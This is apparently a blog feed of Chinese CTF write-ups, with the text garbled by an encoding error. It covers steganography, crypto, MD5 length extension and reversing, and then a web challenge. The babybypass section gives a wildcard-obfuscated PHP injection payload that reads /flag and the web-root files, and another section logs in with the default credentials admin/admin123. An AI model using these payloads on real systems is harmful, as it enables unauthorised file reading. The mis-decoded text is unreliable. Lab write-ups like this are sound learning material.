†ä¸œè¥¿ä¸œè¥¿éƒ½æ˜¯00å¾ˆå¥‡æ€ªï¼Œç„¶åæœç´¢ä¸€ä¸‹jpgæ–‡ä»¶å°¾FFD9<br>å‘ç°äº†åœ¨jpgæ–‡ä»¶å°¾åé¢è¿˜å­˜åœ¨è¿™ä¸€ä¸ªpngå›¾ç‰‡çš„IHDRè¿™ä¸œè¥¿å¯èƒ½åé¢æ˜¯ä¸€ä¸ªpngå›¾ç‰‡ï¼Œè¯•ç€å°è¯•æŠŠå®ƒæŠ å‡ºæ¥å¯¹æ¯”ä¸€ä¸‹çœŸæ­£çš„pngæ–‡ä»¶å¦å­˜ä¸ºçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆ<br><a href="https://imgchr.com/i/ilHvE4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHvE4.md.png" alt="ilHvE4.md.png"></a></p><p>æŠŠè¿™ä¸€æ®µæ”¹ä¸ºæ­£å¸¸çš„pngæ–‡ä»¶å¤´<br><img src="https://s1.ax1x.com/2018/09/30/ilHxUJ.png" alt="ilHxUJ.png"></p><p>å‘ç°æ˜¯ä¸€ä¸ªä¸å®Œæ•´çš„äºŒç»´ç ï¼Œè¿™ç‰µæ‰¯åˆ°äº†å›¾ç‰‡çš„é«˜åº¦é—®é¢˜ï¼Œåœ¨pngé‡Œé¢çš„è¯IHDRåé¢çš„16ä½çš„ä¸œè¥¿å°±æ˜¯åˆ†åˆ«æ”¹é•¿å’Œå®½çš„ï¼Œæ¯ç»„8ä½ï¼ŒæŠŠè¿™ä¸€ä½æ”¹ä¸ºFF<br><img src="https://s1.ax1x.com/2018/09/30/ilHz59.png" alt="ilHz59.png"><br>ç„¶åè®°å¾—åˆ°å®Œæ•´çš„äºŒç»´ç äº†ã€‚æ‰«ç å°±å¯ä»¥å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/09/30/ilbpCR.png" alt="ilbpCR.png"></p><h4 id="é­‚æ–—ç½—"><a href="#é­‚æ–—ç½—" class="headerlink" title="é­‚æ–—ç½—"></a>é­‚æ–—ç½—</h4><p>è¿™ä¸ªæ¸¸æˆä½ æœ‰ä¸¤ç§ç©æ³•ï¼Œç¬¬ä¸€ç§å°±æ˜¯ä½ è‡ªå·±å‡­æœ¬äº‹è¿‡å…³ï¼Œç¬¬äºŒå¼ å°±æ˜¯ä½œå¼Šï¼Œç„¶ååœ¨ç½‘ä¸Šæ‰¾ä½œå¼Šï¼Œè¾“å…¥é‡‘æ‰‹æŒ‡ï¼Œæˆ‘è¾“å…¥çš„é‡‘æ‰‹æŒ‡<br><a href="https://imgchr.com/i/ilbCgx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilbCgx.md.png" alt="ilbCgx.md.png"></a><br>ä¸€å…³å…³ä¸‹æ¥å°±å¯ä»¥çœ‹åˆ°flagäº†<br><img src="https://s1.ax1x.com/2018/09/30/ilbFKK.png" alt="ilbFKK.png"><br>æ³¨æ„ä¸‹flagçš„æ ¼å¼</p><h4 id="æ®è¯´æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ç›®"><a href="#æ®è¯´æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ç›®" class="headerlink" title="æ®è¯´æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ç›®"></a>æ®è¯´æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ç›®</h4><p>Wiresharkæ‰“å¼€åè®®åˆ†çº§ï¼Œå‘ç°TCPä¸‹çš„dataæ•°æ®åŒ…ååˆ†ä¹‹å¤šï¼Œè¿‡æ»¤ä¸€æ³¢çœ‹çœ‹ï¼Œç„¶åè¿½è¸ªæµå‘ç°ä¸€æ®µpythonä»£ç ï¼Œè€Œä¸”è¿˜åœ¨ä¸‹æ–¹å‘ç°ä¸€æ®µbase64çš„ä»£ç <br><a href="https://imgchr.com/i/i8p2A1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8p2A1.md.png" alt="i8p2A1.md.png"></a><br><a href="https://imgchr.com/i/i8pRtx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8pRtx.md.png" alt="i8pRtx.md.png"></a></p><p>çœ‹ä¸€ä¸‹ä»£ç å‘ç°åŠ å¯†è§£å¯†å‡½æ•°éƒ½ç»™ä½ äº†ï¼Œç›´æ¥æŠŠflagé‡Œé¢çš„ä¿¡æ¯è§£ç ä¹‹åæ”¾è¿›ä»£ç é‡Œé¢è·‘ä¸€ä¸‹å°±å¯ä»¥ç›´æ¥å‡ºflagäº†ï¼Œå‰ææ˜¯è¦å°†å¯†æ–‡base64è§£ç ä¸€ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def encrypt(message, passphrase):</span></span><br><span class="line"><span class="comment">#   IV = message[:16]</span></span><br><span class="line"><span class="comment">#   length = 16</span></span><br><span class="line"><span class="comment">#   count = len(message)</span></span><br><span class="line"><span class="comment">#   padding = length - (count % length)</span></span><br><span class="line"><span class="comment">#   message = message + '\0' * padding</span></span><br><span class="line"><span class="comment">#   aes = AES.new(passphrase, AES.MODE_CBC, IV)</span></span><br><span class="line"><span class="comment">#   return aes.encrypt(message)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># message = IV + 'flag is hctf&#123;xxxxxxxxxxxxxxx&#125;'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=='</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print len(message)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example = encrypt(message, 'Qq4wdrhhyEWe4qBF')</span></span><br><span class="line"><span class="comment"># print example</span></span><br><span class="line">ans =  base64.b64decode(flag)</span><br><span class="line">example = decrypt(ans, <span class="string">'Qq4wdrhhyEWe4qBF'</span>) </span><br><span class="line"><span class="keyword">print</span> example</span><br></pre></td></tr></table></figure></p><h4 id="å¤§å®¶æ¥æ‰¾èŒ¬"><a href="#å¤§å®¶æ¥æ‰¾èŒ¬" class="headerlink" title="å¤§å®¶æ¥æ‰¾èŒ¬"></a>å¤§å®¶æ¥æ‰¾èŒ¬</h4><p>è¿™ä¸ªé¢˜ç›®è€ƒäº†ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯<code>binwalk</code>åˆ†ç¦»å›¾ç‰‡å‡ºæ¥ï¼Œå¦å¤–å°±æ˜¯ä¸¤ä¸ªå›¾ç‰‡åšå„ç§è¿ç®—ï¼Œåˆå¾—ç”¨åˆ°<code>StegSolve</code>ï¼Œè¿™ç§ç±»å‹çš„é¢˜ç›®æœ€è¿‘çš„ç½‘é¼æ¯å¥½åƒä¹Ÿæœ‰ï¼Œåæ­£å¥—è·¯å°±é‚£æ ·<br>å…ˆæ”¾è¿›å»<code>binwalk</code>æ£€æµ‹ä¸€ä¸‹å‘ç°æœ‰ä¸¤å¼ å›¾ï¼Œåˆ†ç¦»å‡ºæ¥å³å¯<br><a href="https://imgchr.com/i/i8Qbh8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8Qbh8.md.png" alt="i8Qbh8.md.png"></a><br><code>foremost diff.png -o æ–‡ä»¶å¤¹åå­—</code> åˆ†ç¦»å‡ºæ¥<br>ç„¶ååˆ©ç”¨<code>StegSolve</code>çš„<code>Image Combiner</code>åŠŸèƒ½å¯¹ä¸¤å¼ å›¾ç‰‡è¿›è¡Œåˆ°<code>sub</code>è¿ç®—çš„æ—¶å€™å°±æœ‰ä¸€å¼ äºŒç»´ç <br><img src="https://s1.ax1x.com/2018/10/05/i8QO1g.png" alt="i8QO1g.png"></p><p>æ‰«ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flag</p><h4 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h4><p>è¿™ä¸ªé¢˜ç›®åˆæ˜¯MD5é•¿åº¦æ‹“å±•æ”»å‡»ï¼Œå¦‚æœå¯¹åŸç†ä¸å¤ªç†Ÿæ‚‰çš„äººå‘åšè¿™ä¸ªé¢˜ç›®çš„æ—¶å€™è¿˜æ˜¯æœ‰ç‚¹å¡é¡¿çš„ï¼Œå»ºè®®å¤§å®¶ä¸Šç½‘è‡ªå·±æœæœå­¦ä¹ ä¸€ä¸‹ï¼Œæ¥ç€ç”¨ç¥å™¨<code>hsahpump</code>æ¥å®Œæˆè¿™é¢˜å°±å¥½ï¼Œæˆ‘è¿™é‡Œç”¨çš„è¾“å…¥æ˜¯<code>cyr</code>ï¼Œæ¯•ç«ŸåŸæ¥çš„é¢˜ç›®æŠŠè¿™ä¸ªcyrçš„MD5å·²ç»ç»™å‡ºæ¥äº†ï¼Œæˆ‘ä»¬ä¹Ÿå¥½æ„é€ hashé•¿åº¦æ‹“å±•æ”»å‡»<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 4dbe35eaea655b0a2b0d06391175b8a3</span><br><span class="line">Input Data: cyr</span><br><span class="line">Input Key Length: 16</span><br><span class="line">Input Data to Add: abc</span><br><span class="line">d233e1c6060cc4af248ad189eda145fc</span><br><span class="line">cyr\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00abc</span><br></pre></td></tr></table></figure></p><p>è®°å¾—è¦æŠŠè¾“å…¥çš„16è¿›åˆ¶å“Ÿä¸ªç©ºæ ¼éš”å¼€<br>æˆ‘çš„payload<br><code>63 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 61 62 63</code><br>è¾“å…¥çš„hashå€¼<br><code>d233e1c6060cc4af248ad189eda145fc</code><br>è¿™å°±å¯ä»¥è¾“å‡ºflagäº†</p><h4 id="çŒœçŒœçœ‹"><a href="#çŒœçŒœçœ‹" class="headerlink" title="çŒœçŒœçœ‹"></a>çŒœçŒœçœ‹</h4><p>è¿™ä¸ªé¢˜ç›®æç¤ºäº†ç”¨jå¼€å¤´çš„è½¯ä»¶å¯¹å›¾ç‰‡è¿›è¡Œäº†ç›¸å…³çš„éšå†™ï¼ŒçŒœæµ‹æ˜¯jphideï¼Œ<br>ç„¶åå–å‡ºå¯¹åº”çš„å·¥å…·jphideæ¥æŠŠé‡Œé¢çš„å†…å®¹ç»™å–å‡ºæ¥ï¼Œå‘ç°éœ€è¦å¯†ç <br><a href="https://imgchr.com/i/i8Qxns" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8Qxns.md.png" alt="i8Qxns.md.png"></a><br>å†å»çœ‹çœ‹é¢˜ç›®å‘ç°è¯´ä½ è¦çš„æ˜¯flagå“¦ï¼Œå¯èƒ½å¯†ç å°±æ˜¯flagè¯•ä¸€ä¸‹ï¼Œä¼šå‡ºç°ä¸€æ®µäºŒè¿›åˆ¶ç¼–ç <br>è§£ç ä¸€ä¸‹å‘ç°æ˜¯ä¸€ä¸ªbase64çš„å›¾ç‰‡<br><a href="https://imgchr.com/i/i8lS7q" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8lS7q.md.png" alt="i8lS7q.md.png"></a><br>ç„¶åä¿å­˜æ”¾è¿›HTMLé¡µé¢é‡Œå°±å¯ä»¥å¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œæœ€åæ‰«ä¸€ä¸‹å³å¯<br><img src="https://s1.ax1x.com/2018/10/05/i8l9A0.png" alt="i8l9A0.png"></p><h4 id="PS-Master"><a href="#PS-Master" class="headerlink" title="PS Master"></a>PS Master</h4><p>è¿™ä¸ªé¢˜ç›®å®Œå…¨å°±æ˜¯ä¸€ä¸ªpsçš„é¢˜ç›®<br>é¦–å…ˆç”¨HXDæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªGIFå›¾ç‰‡æˆ‘ä»¬å¯ä»¥ç”¨psæ‰“å¼€å‘ç°é‡Œé¢çš„å›¾å±‚æœ‰ä¸€å¼ äºŒç»´ç ï¼Œå…ˆæŠŠä»–ä¿å­˜èµ·æ¥ï¼Œç„¶åå¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œç”¨å¿«é€Ÿé€‰æ‹©å·¥å…·å°†å®ƒå³ä¸Šè§’çš„ç‹—ç»™é€‰æ‹©ä¸‹ï¼Œç„¶åå³é”®é€‰æ‹©é»‘è‰²å»å¡«å……<br><img src="https://s1.ax1x.com/2018/11/30/FmGPxS.png" alt="FmGPxS.png"></p><p>ç„¶å<code>ctrl + j</code>å¤åˆ¶å›¾å±‚ç„¶å<code>ctrl + t</code>è‡ªç”±å˜æ¢æŠŠè¿™å—è¦†ç›–å·¦ä¸Šè§’ï¼ŒåŒç†è¦†ç›– å·¦ä¸‹è§’<br><code>ctrl + r</code>æ ‡å°ºå¯¹é½ç„¶åä»ä¸Šé¢çš„å°ºå­å¾€ä¸‹æ‹–ï¼Œä»å·¦è¾¹çš„å¾€å³æ‹–ï¼Œä¼šæœ‰æ·¡è“è‰²çš„å‚è€ƒç³»ï¼Œè¿™æ ·å°±èƒ½å¤Ÿå¯¹é½å•¦<br><a href="https://imgchr.com/i/FmGFKg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmGFKg.md.png" alt="FmGFKg.md.png"></a><br>æ‰«ä¸€ä¸‹å³å¯å¾—åˆ°flag</p><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>è¿™ä¸ªé¢˜ç›®è€ƒçš„æ˜¯ä»¿å°„å¯†ç ï¼Œç›´æ¥çˆ†ç ´keyå°±å¥½äº†ï¼Œç›´æ¥ä¸Šè„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">encode = <span class="string">'joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line"><span class="keyword">for</span> key2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> encode:</span><br><span class="line">flag += chr((key1 * (ord(k)<span class="number">-97</span>) + key2 ) % <span class="number">26</span> + <span class="number">97</span>);</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">flag  = <span class="string">''</span></span><br></pre></td></tr></table></figure></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h4><p>è¿™ä¸ªé¢˜ç›®æ„æ€å¾ˆæ˜ç¡®å«ä½ ç”¨Jebæ‰“å¼€ï¼Œä½†æ˜¯ä¸Šç½‘æœäº†å¾ˆä¹…æœ€åæ‰¾åˆ°äº†ä¸ªå¾ˆå¤è€ç‰ˆæœ¬çš„Jebæ‰“å¼€ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªflagï¼Œç›´æ¥æ‰“å¼€é‚£ä¸ªæ–‡ä»¶å³å¯çœ‹è§flag<br><a href="https://imgchr.com/i/FmGnP0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmGnP0.md.png" alt="FmGnP0.md.png"></a><br>ä½†æ˜¯ä¸ªäººè§‰å¾—å¦å¤–ä¸€ä¸ªå®‰å“é€†å‘å·¥å…·Android Killeræ›´å¥½ç”¨ã€‚ã€‚ã€‚ã€‚ã€‚ä¹Ÿèƒ½çœ‹åˆ°flag</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’9æœˆéƒ¨åˆ†èµ›é¢˜å¤ç°</title>
      <link href="/anheng-9month.html"/>
      <url>/anheng-9month.html</url>
      <content type="html"><![CDATA[<blockquote><p>To be patientâ€¦</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èµ¶ç´§è¶ç€ç”µè„‘çš„å±å¹•ä¿®å¥½äº†ï¼Œåˆšå¥½å®‰æ’çš„webé¢˜ç›®æœ‰å¤ç°ï¼Œèµ¶ç´§åšã€‚ã€‚ã€‚ã€‚ã€‚åˆä»è¿™å‡ ä¸ªé¢˜ç›®é‡Œé¢å­¦ä¹ åˆ°æ–°çŸ¥è¯†äº†<a id="more"></a>å°ç»“ä¸€ä¸‹</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="babybypass"><a href="#babybypass" class="headerlink" title="babybypass"></a>babybypass</h4><p>è¿™ä¸ªé¢˜ç›®æˆ‘è®°å¾—æˆ‘å½“åˆåšçš„æ—¶å€™æ˜¯ä¸€ç›´è€ƒè™‘ç€ç”¨<code>$</code>ä»¥åŠ<code>_</code>å»ç»•è¿‡è¿™äº›æ•°å­—å­—æ¯ä¹‹ç±»çš„ä¸œè¥¿ï¼Œçªç„¶å‘ç°ä»–è¿™ä¸ªé¢˜ç›®é‡Œé¢æŠŠé‚£ä¸ª<code>$</code>ä»¥åŠ<code>_</code>ä¹Ÿç»è¿‡äº†è¿‡æ»¤ï¼Œè¿™æ ·çš„è¯å°±å°‘äº†å¾ˆå¤šå¯èƒ½æ€§ï¼Œè€Œä¸”è¿™é¢˜æ¯”åŸé¢˜çš„é™åˆ¶é•¿åº¦å°äº†ï¼Œæ›´æœ‰éš¾åº¦ã€‚ç°åœ¨å°±å¼€å§‹æ€»ç»“ä¸€ä¸‹ä»è¿™ä¸ªé¢˜ç›®å­¦åˆ°çš„çŸ¥è¯†ç‚¹<br>1.phpçŸ­æ ‡ç­¾è¾“å‡ºï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹å¾ˆä¹…ä¹‹å‰å°±å·²ç»è§è¿‡ã€‚<br><code>&lt;?=?&gt;</code>è¿™ä¸ªå°±æ˜¯çŸ­æ ‡ç­¾ï¼Œç›¸å½“äº<code>&lt;?php echo â€¦;?&gt;</code>ä¸€èˆ¬åœ¨phpçš„é…ç½®æ–‡ä»¶<code>php.ini</code>ä¸­æœ‰ä¸€ä¸ª<code>short_open_tag</code>çš„å€¼ï¼Œå¼€å¯ä»¥åå¯ä»¥ä½¿ç”¨PHPçš„çŸ­æ ‡ç­¾ï¼š<code>&lt;? ?&gt;</code>ï¼Œä½†æ˜¯åœ¨ç°å®å¼€å‘ä¸­ä¸€èˆ¬ä¸æ¨å´‡è¿™ç§åšæ³•ã€‚ã€‚<br>ä½†è¿™ä¸ªé¢˜ç›®å°±å¾ˆå·§å¦™ç”¨äº†è¿™ä¸ªä¸œè¥¿<br>2.ç¬¬äºŒä¸ªå°±æ˜¯å…³äºphpå‡½æ•°evalå‡½æ•°çš„ä¸€äº›ä¸œè¥¿ï¼Œè¿™é‡Œçš„phpæ‰§è¡Œå‡½æ•°æ˜¯evalï¼Œåœ¨phpå®˜æ–¹æ‰‹å†Œä¸Šé¢æœ‰è¿™æ ·ä¸€å¥è¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå‘äº†ï¼Œè¦æƒ³æ‰§è¡Œä»£ç çš„è¯ï¼Œæˆ‘ä»¬å°±éœ€è¦å…ˆç”¨<code>?&gt;</code>å»é—­åˆï¼ŒæŠŠä¸Šä¸€æ®µä»£ç å°±ç»™ç»“æŸç¦»å¼€ ï¼Œç„¶åæˆ‘ä»¬æ‰å¯ä»¥åˆ©ç”¨<code>&lt;?=?&gt;</code>å»è¾“å‡º<br><a href="https://imgchr.com/i/ilI9II" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilI9II.md.png" alt="ilI9II.md.png"></a></p><p>åŒºåˆ«ä¸€ä¸‹æœ‰äº›ç³»ç»Ÿæ‰§è¡Œå‡½æ•°æ¯”å¦‚system(æœ‰å›æ˜¾)ï¼Œexec(æ²¡å›æ˜¾)ï¼Œä»¥åŠåå¼•å·è¿™ç±»çš„ï¼Œè¿™æ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‡½æ•°çš„ï¼Œä¸€ä¼šæˆ‘ä»¬ä¹Ÿä¼šç”¨åˆ°<br><img src="https://s1.ax1x.com/2018/09/30/ilIPit.png" alt="ilIPit.png"><br><img src="https://s1.ax1x.com/2018/09/30/ilIiJP.png" alt="ilIiJP.png"></p><p>3.Linuxé€šé…ç¬¦çš„ä½œç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*        ä»£è¡¨ã€ 0 ä¸ªæˆ–æ— ç©·å¤šä¸ªã€ä»»æ„å­—ç¬¦</span><br><span class="line">?        ä»£è¡¨ã€ä¸€å®šæœ‰ä¸€ä¸ªã€ä»»æ„å­—ç¬¦</span><br></pre></td></tr></table></figure></p><p>4.Linux ä¸‹é¢ä¸€åˆ‡çš†æ–‡ä»¶<br>å°±æ˜¯è¯´æˆ‘ä»¬å¹³å¸¸ä¸€èˆ¬åœ¨ä¸‹é¢Linuxä¸‹é¢çš„è¾“å…¥çš„å‘½ä»¤ï¼Œéƒ½å¯ä»¥é€šè¿‡æ–‡ä»¶å»åŒæ ·çš„æ‰§è¡Œï¼Œè¿™å¯¹æˆ‘æ¥è¯´æ˜¯æ–°çŸ¥è¯†ã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/09/30/ilIMiq.png" alt="ilIMiq.png"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å»å®ç°payloadï¼Œè¿™ä¸ªé¢˜ç›®æ˜¯Apacheæ­çš„ï¼Œæˆ‘ä»¬å¯ä»¥å»é»˜è®¤ç›®å½•å…ˆæŸ¥çœ‹ä¸€æ³¢æ–‡ä»¶ï¼Œä¸€èˆ¬æ¥è¯´é»˜è®¤ç›®å½•åœ¨<code>/var/www/html</code></p><p>æ„é€ <code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code>ç›¸å½“äº<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;</code></p><p>ç„¶åä¼šå‘ç°phpä»£ç é‡Œé¢çš„æºä»£ç getflagé‚£ä¸€éƒ¨åˆ†çš„å‡½æ•°æ˜¯æ˜¯ä»/flagé‡Œé¢è¯»å–çš„ã€‚ã€‚ã€‚ã€‚å¬è¯´è¿™é¢˜çš„getflagå‡½æ•°ä¹Ÿæ˜¯ä¸ªå‘ã€‚ã€‚å¥½åƒä¸èƒ½ç›´æ¥ä»urlé‡Œé¢è°ƒç”¨</p><p>æ‰€ä»¥å†æ¥æ„é€ ä¸€ä¸‹<br><code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>ç›¸å½“äº<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>å¾—åˆ°flag<br><a href="https://imgchr.com/i/ilIQJ0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIQJ0.md.png" alt="ilIQJ0.md.png"></a></p><h4 id="ç¥å¥‡çš„CMS"><a href="#ç¥å¥‡çš„CMS" class="headerlink" title="ç¥å¥‡çš„CMS"></a>ç¥å¥‡çš„CMS</h4><p>è¿›å…¥ç½‘ç«™å‘ç°æœ‰ç”¨æˆ·ç™»å½•ï¼Œç„¶åæµ‹è¯•å‘ç°å¼±å¯†ç <br><code>admin admin123</code></p><p>ç„¶åç‚¹å‡»å‡ ä¸ªæ¨¡å—å‘ç°æœ‰ä¸¤ä¸ªæ¨¡å—æœ‰ç‚¹å¥‡æ€ª<br><a href="https://imgchr.com/i/ilIlWV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIlWV.md.png" alt="ilIlWV.md.png"></a></p><p>è¿™ä¸¤ä¸ªæ¨¡å—ä¸€ä¸ªæ¨¡å—æœ‰æç¤ºï¼Œå¦ä¸€ä¸ªæ¨¡å—å­˜åœ¨è¾“å…¥å¹¶ä¸”å­˜åœ¨å›æ˜¾<br>å…ˆçœ‹æç¤ºï¼Œä¸€æ˜¯è®©ä½ ä¸‹è½½æºç åŒ…ï¼Œå¦å¤–æ˜¯æç¤ºflagåœ¨å“ªï¼Œå…ˆæŠŠæºç åŒ…ä¸‹è½½ä¸‹æ¥ï¼Œæºç é‡Œé¢æœ‰ä¸¤ä¸ªæ§åˆ¶å™¨ï¼Œä¸€ä¸ªæ˜¯<code>content</code>ï¼Œå¦ä¸€ä¸ªæ˜¯<code>site</code></p><p>å‘ç°æ˜¯Yiiæ¡†æ¶çš„ä¸œè¥¿ï¼Œå¹¸äºæˆ‘è¿˜æ˜¯åšè¿‡Yiiæ¡†æ¶çš„å¼€å‘çš„ï¼Œå¯¹æ­¤è¿˜æ˜¯æœ‰ç‚¹å°ç†Ÿæ‚‰ã€‚ã€‚ã€‚</p><p>è¿™é‡Œçœ‹å›æ”¾çš„æ—¶å€™è¿˜æ˜¯å­¦åˆ°ç‚¹ä¸œè¥¿çš„ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨ä»£ç å®¡è®¡çš„æ—¶å€™ä¸€èˆ¬è¦æ‰¾æœ‰è¾“å…¥æœ‰è¾“å‡ºçš„åœ°æ–¹ï¼Œè¿™é‡Œå¾ˆå¯èƒ½å°±å­˜åœ¨è¿™æ¼æ´ï¼Œè¿™å°±ç›¸å½“äºåœ¨è„‘é‡Œé¢å»ºäº†ä¸€ä¸ªæ¨¡å‹ï¼Œä½†æ˜¯æƒ³æƒ³ä¹Ÿå¾ˆæ­£å¸¸ï¼Œå¹³å¸¸æˆ‘ä»¬å­¦ç¼–ç¨‹çš„æ—¶å€™ä¹Ÿæ²¡è¿‡å¤šçš„å»è€ƒè™‘ç¼–ç¨‹çš„è¾“å…¥è¾“å‡ºï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨ä¸€å¼€å§‹ç”¨Cç¼–ç¨‹çš„æ—¶å€™ä½ ä¼šå¿˜æ‰é™¤æ•°ä¸ä¸º0çš„å‰æå—ï¼Ÿæ‰€ä»¥è¯´æˆ‘ä»¬æ›´å¤šçš„æ˜¯è€ƒè™‘ä»£ç çš„æ ¸å¿ƒåŠŸèƒ½èƒ½å¦å®ç°ã€‚</p><p>æ‰€ä»¥åœ¨<code>ADD_IMG</code>(å› ä¸ºæœ‰è¾“å…¥æœ‰å›æ˜¾)é¡µé¢é‡Œé¢å°±å¾ˆæœ‰å¯èƒ½å­˜åœ¨æ¼æ´äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ä¸“æ³¨ä»£ç é‡Œé¢æè¿°è¿™ä¸€æ®µä¸œè¥¿çš„å†…å®¹</p><p> Yiiæ¡†æ¶è®²ç©¶çš„æ˜¯MVCæ¶æ„ï¼Œä¸€èˆ¬ä»£ç 